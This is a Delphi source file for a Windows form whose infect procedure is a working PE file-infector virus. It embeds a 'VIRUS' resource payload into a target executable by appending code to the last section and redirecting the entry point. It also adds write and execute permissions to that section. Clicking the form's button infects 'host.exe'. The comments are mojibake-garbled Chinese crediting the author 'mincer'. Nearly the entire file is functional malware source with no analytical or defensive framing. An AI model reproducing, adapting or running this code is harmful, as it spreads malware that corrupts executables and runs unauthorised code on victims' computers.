   unit Unit1;
   //==========================================
   // ¹ý³Ìinfect¸ºÔð´«È¾
   // Î´¼Ó´íÎó´¦Àí£¬ÓÐÐËÈ¤µÄ¿ÉÒÔ¼ÓÉÏ
   //  create by mincer
   //==========================================
   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     StdCtrls;

   type
     TForm1 = class(TForm)
       Button1: TButton;
       Label1: TLabel;
       procedure Button1Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     procedure infect(host_filename:string);

   implementation

   {$R *.DFM}

   procedure infect(host_filename:string);
   const
   v_SIZE=1152;
   OFFSET_RAV=$2aa;
   DFILE_SIZE=$2ca;
   DFILE_OFFSET=$2ce;

   var
   pe:_IMAGE_FILE_HEADER;
   ope:_IMAGE_OPTIONAL_HEADER;
   PE_OFFSET:integer;
   m_host:TFileStream;
   SECTION_OFFSET:integer;
   section:_IMAGE_SECTION_HEADER;

   OFFSET_Write:integer;
   buf:integer;
   virus_file:TMemoryStream;
   bin_file:TFileStream;
   bin_file_Size:integer;
   Bin_size:integer;
   normal_size:integer;
   RAV:integer;
   RES_File:TResourceStream;
   l:integer;
   begin

   RES_File:=TResourceStream.Create(HInstance,'VIRUS','DATA');
   virus_file:=TMemoryStream.Create;
   RES_File.SaveToStream(virus_file);

   bin_file:=TFileStream.Create(application.ExeName,fmOpenRead or fmShareDenyNone);
   m_host:=TFileStream.Create(host_filename,fmOpenReadWrite{fmOpenRead or fmShareDenyNone});
   m_host.Seek($3c,soFromBeginning);
   m_host.Read(buf,4);
   m_host.Seek(buf+4,soFromBeginning);

   m_host.Read(pe,sizeof(pe));
   PE_OFFSET:=m_host.Position;
   m_host.Read(ope,sizeof(ope));
   m_host.Seek((pe.NumberOfSections-1)*$28,soFromCurrent);


   SECTION_OFFSET:=m_host.Position;
   m_host.Read(section,sizeof(section));


   //virus_file.LoadFromFile(virus_filename);

   virus_file.Seek(OFFSET_RAV ,soFromBeginning);
   RAV:=ope.ImageBase+ope.AddressOfEntryPoint;
   virus_file.Write(RAV,4);

   virus_file.Seek(DFILE_SIZE ,soFromBeginning);






   bin_file_Size:=bin_file.Size;
   virus_file.WriteBuffer(bin_file_Size,4);
   OFFSET_Write:=section.PointerToRawData+section.Misc.VirtualSize;

   virus_file.Seek(DFILE_OFFSET ,soFromBeginning);


   Bin_size:=OFFSET_Write+v_SIZE;
   virus_file.WriteBuffer(Bin_size,4);

   ope.AddressOfEntryPoint:=section.VirtualAddress+section.Misc.VirtualSize;
   ope.SizeOfImage:=ope.SizeOfImage+v_SIZE;
   section.SizeOfRawData:=section.Misc.VirtualSize+v_SIZE;
   section.Misc.VirtualSize:=section.SizeOfRawData;
   section.Characteristics:=IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_EXECUTE or section.Characteristics;


   m_host.Seek(PE_OFFSET,0);
   m_host.Write(ope,sizeof(ope));
   m_host.Seek(SECTION_OFFSET,0);
   m_host.Write(section,sizeof(section));
   m_host.Seek(OFFSET_Write,0);

   virus_file.Seek(0,0);
   normal_size:=virus_file.Size;
   m_host.CopyFrom(virus_file,normal_size);

   m_host.CopyFrom(bin_file,bin_file_size);


   m_host.Free;
   virus_file.Free;
   bin_file.Free;
   RES_File.Free;
   end;


   procedure TForm1.Button1Click(Sender: TObject);
   begin
   infect('host.exe');
   end;

   end.
